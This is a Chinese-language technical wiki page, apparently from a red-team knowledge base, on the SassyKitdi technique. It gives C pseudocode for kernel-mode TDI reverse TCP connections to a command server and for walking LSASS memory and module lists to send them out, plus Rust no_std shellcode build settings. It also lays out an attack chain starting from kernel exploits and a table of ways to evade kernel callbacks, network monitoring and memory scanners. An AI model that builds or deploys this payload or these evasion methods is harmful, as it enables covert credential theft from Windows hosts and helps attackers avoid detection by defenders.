---
title: Windows 内核态 TDI 实现反向 TCP 套接字与 LSASS Dump 技术详解
description: 系统梳理 Windows 内核态 TDI (Transport Driver Interface) 实现反向 TCP 套接字的完整流程：打开
  \Device\Tcp 设备对象、构造 TRANSPORT_ADDRESS 与 ConnectionContext、通过 IRP_MJ_INTERNAL_DEVICE_CONTROL
  发送 TDI_CONNECT 与 TDI_SEND IOCTL、MDL 内存锁定与缓冲区管理，并结合内核态 LSASS 进程内存枚举与模块遍历实现无文件凭据窃取，形成内核态无文件网络通信与内存窃取技术页。
category: program-analysis
tags:
- TDI
- Transport Driver Interface
- Kernel Mode
- Reverse Shell
- TCP Socket
- LSASS Dump
- IRP_MJ_INTERNAL_DEVICE_CONTROL
- MDL
- Memory Descriptor List
- Rust
- Shellcode
- Rootkit
- Red Teaming
- Windows Internals
- Credential Theft
date: 2025-01-15
updated: '2026-11-15'
---

## 概述

本页系统梳理 **SassyKitdi** 技术实现细节：利用 Windows 内核态 **TDI (Transport Driver Interface)** 建立反向 TCP 连接，结合内核特权枚举 LSASS 进程内存区域与已加载模块，通过网络传输原始内存数据供攻击端转换为 minidump 并提取凭据。核心流程覆盖：

1. **设备对象获取**：`ZwCreateFile` 打开 `\Device\Tcp`，通过 `EaBuffer` 传递 `TransportAddress` 与 `ConnectionContext` 创建 Transport 与 Connection 句柄。
2. **连接建立**：对文件对象关联的设备对象发送 `IRP_MJ_INTERNAL_DEVICE_CONTROL`，`MinorFunction = TDI_CONNECT`，携带目标 `TRANSPORT_ADDRESS`（大端序 IP/端口）。
3. **数据发送**：分配非分页池缓冲区 → `IoAllocateMdl` 构造 MDL → `MmProbeAndLockPages` 锁定物理页 → 分派 `TDI_SEND` IRP → 完成后解锁释放。
4. **LSASS 内存枚举**：`KeStackAttachProcess` 附加进程上下文 → `ZwQueryVirtualMemory` 遍历 `MEMORY_BASIC_INFORMATION` 链 → 读取可读区域发送。
5. **模块列表获取**：通过 `ZwQueryInformationProcess` 获取 PEB → 遍历 `PEB->Ldr.InLoadOrderLinks` 链表提取 `LDR_DATA_TABLE_ENTRY` 中的 `FullDllName`、`DllBase`、`SizeOfImage`。
6. **Rust 无运行时 Shellcode 开发**：`no_std` + `core` + 自定义 `ntdef` 类型定义库，利用 RAII 自动资源管理、`Result<?>` 错误传播、`opt-level='z' + lto=true` 极致压缩体积，生成 ~3300 字节 PIC shellcode。

> **适用版本**：Windows 2000 至 Windows 10 通用，无需版本相关 DKOM 偏移。  
> **执行前提**：Payload 需在 `PASSIVE_LEVEL` 运行；若 Exploit 入口为 `DISPATCH_LEVEL`，需自行降级 IRQL。

---

## TDI 反向 TCP 套接字完整流程

### 打开 TCP 设备对象

```c
// 伪代码：构造 ObjectAttributes 与 EaBuffer
OBJECT_ATTRIBUTES oa = { .ObjectName = L"\\Device\\Tcp" };
FILE_FULL_EA_INFORMATION ea[] = {
    { .EaNameLength = sizeof("TransportAddress"), .EaName = "TransportAddress",
      .EaValueLength = sizeof(TRANSPORT_ADDRESS), .EaValue = &local_addr },  // 0.0.0.0:0
    { .EaNameLength = sizeof("ConnectionContext"), .EaName = "ConnectionContext",
      .EaValueLength = sizeof(PVOID), .EaValue = &ctx }                      // 任意上下文
};
ZwCreateFile(&hTransport, GENERIC_READ|GENERIC_WRITE, &oa, &iosb, NULL,
             FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ|FILE_SHARE_WRITE,
             FILE_CREATE, 0, ea, sizeof(ea));
```

- **TransportAddress FEA**：填充 `TRANSPORT_ADDRESS` → `TA_ADDRESS` → `TDI_ADDRESS_IP`，`sin_port=0`、`in_addr=0` 表示由内核分配临时源端口并绑定主接口。
- **ConnectionContext FEA**：任意指针值，后续 IRP 可通过 `FileObject->FsContext2` 取回，用于多路复用区分连接。

> 交叉引用：`[[windows-syscall-internals-sysenter-kifastcallentry]]` 中 `ZwCreateFile` 系统调用入内核完整链路。

### 发起 TDI_CONNECT

```c
// 获取设备对象
PDEVICE_OBJECT dev = IoGetRelatedDeviceObject(fileObj);

// 构造 IRP
PIRP irp = IoBuildDeviceIoControlRequest(
    IOCTL_TDI_CONNECT, dev, NULL, 0, NULL, 0, TRUE, &event, &iosb);
PIO_STACK_LOCATION irpSp = IoGetNextIrpStackLocation(irp);
irpSp->MinorFunction = TDI_CONNECT;
irpSp->Parameters.ConnectionInformation.RemoteAddress = &remoteAddr; // TRANSPORT_ADDRESS (大端序)

// 分派并等待
IofCallDriver(dev, irp);
KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
```

- `IOCTL_TDI_CONNECT` 实际为 `IRP_MJ_INTERNAL_DEVICE_CONTROL` + `MinorFunction = TDI_CONNECT`。
- `RemoteAddress` 指向目标 `TRANSPORT_ADDRESS`（IPv4 为 `AF_INET=2`，端口/地址均大端序）。

> 交叉引用：`[[process-injection-tampering-techniques]]` 中内核 IRP 分派与等待模式通用原理。

### TDI_SEND 与 MDL 缓冲区管理

```c
// 1. 分配非分页池缓冲区并拷贝数据
PVOID buf = ExAllocatePool(NonPagedPool, len);
RtlCopyMemory(buf, data, len);

// 2. 构造 MDL 并锁定物理页
PMDL mdl = IoAllocateMdl(buf, len, FALSE, FALSE, NULL);
MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess); // 锁定防换出

// 3. 构造 SEND IRP
PIRP irp = IoBuildDeviceIoControlRequest(
    IOCTL_TDI_SEND, dev, NULL, 0, NULL, 0, TRUE, &event, &iosb);
PIO_STACK_LOCATION irpSp = IoGetNextIrpStackLocation(irp);
irpSp->MinorFunction = TDI_SEND;
irpSp->Parameters.Send.SendFlags = 0;
irpSp->Parameters.Send.SendLength = len;
irp->MdlAddress = mdl; // 关联 MDL

// 4. 分派
IofCallDriver(dev, irp);
KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);

// 5. 清理（I/O 管理器自动解锁 MDL，驱动需自行释放缓冲区）
ExFreePool(buf);
```

| 步骤 | 关键 API | 作用 |
|------|----------|------|
| 分配缓冲区 | `ExAllocatePool(NonPagedPool)` | 保证物理内存常驻，DPC 级安全 |
| 构造 MDL | `IoAllocateMdl` | 描述虚拟地址范围 → 物理页数组映射 |
| 锁定物理页 | `MmProbeAndLockPages` | 防止页面被换出，DMA/网络栈直接访问 |
| 关联 IRP | `irp->MdlAddress = mdl` | 网络协议栈通过 MDL 链散聚发送 |
| 完成后 | `MmUnlockPages` + `IoFreeMdl` | 由 I/O 管理器在 IRP 完成时自动调用 |

> 交叉引用：`[[pe-manual-mapping-loader-implementation]]` 中 `MmProbeAndLockPages` 用于手动映射节区内存锁定的同类用法。

---

## 内核态 LSASS 内存枚举与模块遍历

### 获取操作系统版本信息

```c
RTL_OSVERSIONINFOW ver = { .dwOSVersionInfoSize = sizeof(ver) };
RtlGetVersion(&ver); // 导出函数，无需特权
// 发送 ver.dwMajorVersion, dwMinorVersion, dwBuildNumber
```

> 交叉引用：`[[mimikatz-source-code-architecture-golden-ticket-audit]]` 中 Mimikatz 解析 minidump 所需版本字段对应。

### 遍历进程虚拟内存区域

```c
// 附加到 LSASS 进程上下文
KAPC_STATE apc;
KeStackAttachProcess(lsassEprocess, &apc);

MEMORY_BASIC_INFORMATION mbi;
PVOID base = 0;
while (NT_SUCCESS(ZwQueryVirtualMemory(
        (HANDLE)-1, base, MemoryBasicInformation, &mbi, sizeof(mbi), &retLen))) {
    if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READABLE)) {
        // 读取 mbi.RegionSize 字节并通过 TDI_SEND 发送
    }
    base = (PUCHAR)base + mbi.RegionSize;
}
KeUnstackDetachProcess(&apc);
```

- `ZwQueryVirtualMemory` 配合 `ProcessHandle = -1`（当前进程上下文）遍历整个用户地址空间。
- 仅发送 `MEM_COMMIT` 且可读的区域，减少传输量。

> 交叉引用：`[[mimikatz-sekurlsa-pth-internals]]` 中 `LogonSessionList` 遍历同样依赖进程上下文切换与虚拟内存读取。

### 获取已加载模块列表 (PEB->Ldr)

```c
PROCESS_BASIC_INFORMATION pbi;
ZwQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
PPEB peb = pbi.PebBaseAddress;

PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
for (PLIST_ENTRY entry = head->Flink; entry != head; entry = entry->Flink) {
    PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    // 发送 mod->FullDllName (UNICODE_STRING), mod->DllBase, mod->SizeOfImage
}
```

- `LDR_DATA_TABLE_ENTRY` 关键字段：`FullDllName`、`DllBase`、`SizeOfImage`、`Flags`。
- 该链表顺序反映加载顺序，便于 Minidump 重建模块映射。

> 交叉引用：`[[pe-export-table-internals]]`、`[[pe-import-table-internals]]` 解析模块导出/导入表辅助凭据提取。

---

## Rust 无运行时 Shellcode 工程化实践

### 核心优势

| 特性 | 说明 |
|------|------|
| `no_std` + `core` | 无运行时、无堆分配器依赖，适配 Shellcode 裸机环境 |
| RAII / `Drop` trait | 句柄、MDL、池内存自动释放，消除泄漏风险 |
| `Result<T, NTSTATUS>` + `?` | 零开销错误传播，编译期单态化生成紧凑分支 |
| `opt-level='z'` + `lto=true` | LLVM 链路时优化 + 体积优先，生成 ~3300 字节 PIC 代码 |
| `ntdef` 类型定义库 | 纯类型定义、零静态数据、无重定位，配合 `stacklstr` 栈上宽字符串 |

### 关键 Crate 与构建配置

```toml
# Cargo.toml
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true

[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
rustflags = ["-C", "link-arg=-nostdlib", "-C", "link-arg=-Wl,--entry=_DllMainCRTStartup"]
```

- 交叉编译工具链：`rustup target add x86_64-pc-windows-gnu` + `mingw-w64`。
- 产物提取：编译为 DLL，提取 `_DllMainCRTStartup` 至 `malloc` 间代码段作为原始 Shellcode。

> 交叉引用：`[[rust-proc-macro-win32-dynamic-import]]` 中 Rust 过程宏实现 Win32 API 动态导入、符号哈希化的同类工程化思路。

### 代码片段示例：RAII 封装 MDL

```rust
struct Mdl(*mut MDL);
impl Mdl {
    fn new(buf: *mut c_void, len: usize) -> Result<Self, NTSTATUS> {
        let mdl = unsafe { IoAllocateMdl(buf, len as u32, FALSE, FALSE, ptr::null_mut()) };
        if mdl.is_null() { return Err(STATUS_INSUFFICIENT_RESOURCES); }
        let status = unsafe { MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess) };
        if !NT_SUCCESS(status) { unsafe { IoFreeMdl(mdl) }; return Err(status); }
        Ok(Self(mdl))
    }
}
impl Drop for Mdl {
    fn drop(&mut self) {
        unsafe { MmUnlockPages(self.0); IoFreeMdl(self.0); }
    }
}
```

---

## 攻击链整合与检测对抗视角

### 完整攻击链

```mermaid
graph LR
    A[Kernel Exploit<br>(EternalBlue/BlueKeep/本地驱动漏洞)] --> B[降级至 PASSIVE_LEVEL]
    B --> C[ZwCreateFile \\Device\\Tcp]
    C --> D[TDI_CONNECT 反向连接 C2]
    D --> E[KeStackAttachProcess LSASS]
    E --> F[ZwQueryVirtualMemory 遍历内存区域]
    F --> G[PEB->Ldr 遍历模块列表]
    G --> H[TDI_SEND + MDL 发送原始内存/模块信息]
    H --> I[攻击端重组 Minidump]
    I --> J[Mimikatz/Pypykatz 提取凭据]
```

### 检测面与对抗

| 检测层面 | 典型特征 | 对抗思路 |
|----------|----------|----------|
| **内核回调** | `ObRegisterCallbacks` 拦截 `ZwCreateFile` `\Device\Tcp` | 直接调用 `IoCreateFileEx` 绕过对象管理器回调，或 DKOM 修改回调链表 |
| **网络流量** | 非标准进程发起 TCP 连接、原始内存数据外传 | 域名前置/CDN 隐匿、TLS 加密载荷、流量填充与乱序 |
| **内存扫描** | LSASS 进程上下文被附加、大量 `ZwQueryVirtualMemory` 调用 | `[[memory-scanning-tools-evasion-techniques]]` 中 FOLIAGE/Ekko/AceLdr 睡眠加密、内存权限动态切换 |
| **Sysmon** | 无 Event ID 1/3/10（用户态进程/网络/线程创建） | 纯内核态无用户态痕迹，结合 `[[named-pipe-smb-detection-sysmon]]` 思路改用 SMB 命名管道通信 |

> 交叉引用：`[[cobalt-strike-external-c2-smb-beacon]]`、`[[smb-named-pipe-c2-communication]]` 提供基于 SMB 命名管道的替代通信通道，规避 TDI 网络流量特征。

---

## 扩展与演进方向

1. **阶段化加载**：初始 Shellcode (1-1.5 KB) 仅建立连接 → 下载反射式加载的完整内核模块（参考 `[[aceldr-technical-analysis]]` RDI/sRDI/Donut 技术）。
2. **通信协议升级**：TDI → WSK (Winsock Kernel) → 自定义加密协议（参考 `[[iox-proxy-protocol-evasion]]` 协议栈重构、随机 Padding、多路复用元数据保护）。
3. **凭据获取多样化**：除 LSASS Dump 外，结合 `[[mimikatz-sekurlsa-pth-internals]]` Pass-the-Hash、`[[windows-token-nerfing-pplguard-trusted-labels]]` Token Nerfing 实现无文件横向移动。
4. **PPL/受保护进程绕过**：注入 `WinTcb-Light` 级进程（`wininit.exe`、`MsMpEng.exe`）对抗内存扫描，参考 `[[ppl-injection-createprocess-bof-fix]]`、`[[ppldump-userland-ppl-bypass-evasion]]`。

---

## 参考资源

| 资源 | 链接 |
|------|------|
| 原文博客 (zerosum0x0) | https://zerosum0x0.blogspot.com/2020/08/sassykitdi-kernel-mode-tcp-sockets.html |
| SassyKitdi GitHub (PoC) | https://github.com/zerosum0x0/SassyKitdi |
| File Extended Attributes (Windows) | https://en.wikipedia.org/wiki/Extended_file_attributes#Windows_NT |
| MDL 官方文档 | https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls |
| MmProbeAndLockPages | https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages |
| memexec (LSASS 枚举参考) | https://github.com/eddieivan01/memexec |
| min-sized-rust 优化指南 | https://github.com/johnthagen/min-sized-rust |
| stacklstr 栈上宽字符串 | https://github.com/jmage-rs/stacklstr |

---

## 相关知识库页面索引

- 内核系统调用与 IRP 模型：`[[windows-syscall-internals-sysenter-kifastcallentry]]`
- PE 手动映射与内存锁定：`[[pe-manual-mapping-loader-implementation]]`
- LSASS 凭据窃取内核实现：`[[mimikatz-sekurlsa-pth-internals]]`
- Mimikatz 源码架构与黄金票据：`[[mimikatz-source-code-architecture-golden-ticket-audit]]`
- 进程注入与镂空技术对比：`[[process-injection-tampering-techniques]]`
- 内存扫描工具与 UDRL 对抗：`[[memory-scanning-tools-evasion-techniques]]`
- SMB 命名管道 C2 通信：`[[smb-named-pipe-c2-communication]]`、`[[cobalt-strike-external-c2-smb-beacon]]`
- PPL 进程注入与绕过：`[[ppl-injection-createprocess-bof-fix]]`、`[[ppldump-userland-ppl-bypass-evasion]]`
- Rust 红队工程化：`[[rust-proc-macro-win32-dynamic-import]]`
- 协议对抗型代理 iox：`[[iox-proxy-protocol-evasion]]`
- 内网穿透与隧道技术体系：`[[internal-network-pivoting-techniques]]`

## 来源

- [0x4d5a-202103-202209_17](../sources/0x4d5a-202103-202209_17.md)
